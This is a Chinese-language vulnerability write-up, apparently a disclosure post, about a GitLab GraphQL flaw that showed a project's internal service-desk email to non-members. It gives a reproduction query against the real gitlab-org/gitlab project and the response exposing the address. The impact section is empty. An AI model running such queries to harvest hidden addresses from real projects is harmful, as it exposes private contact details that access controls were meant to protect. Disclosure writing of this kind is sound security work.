背景

这个漏洞是一个叫albatraoz的小哥发现的,今年一月份刚刚发现的, 如果任何项目所有者决定在他们的服务台电子邮件地址添加后缀，以防御垃圾邮件，电子邮件地址将通过graphql暴露。

复现步骤

1.跳转至https://gitlab.com/-/graphql-explorer

2.执行下面一个查询:

query{  
  project(fullPath:"gitlab-org/gitlab") {  
    id  
    serviceDeskAddress  
  }  
}

3.将在响应中看到项目的内部服务台电子邮件。

{
  "data": {  
    "project": {  
      "id": "gid://gitlab/Project/278964",  
      "serviceDeskAddress": "contact-project+gitlab-org-gitlab-278964-issue-[@]incoming.gitlab.com"  
    }  
  }  
}

按照文档中的逻辑来说: 服务台电子邮件地址应该只对具有访问权限的项目成员可见。但是在这里,服务台的电子邮件地址对非项目成员是可见的。

影响
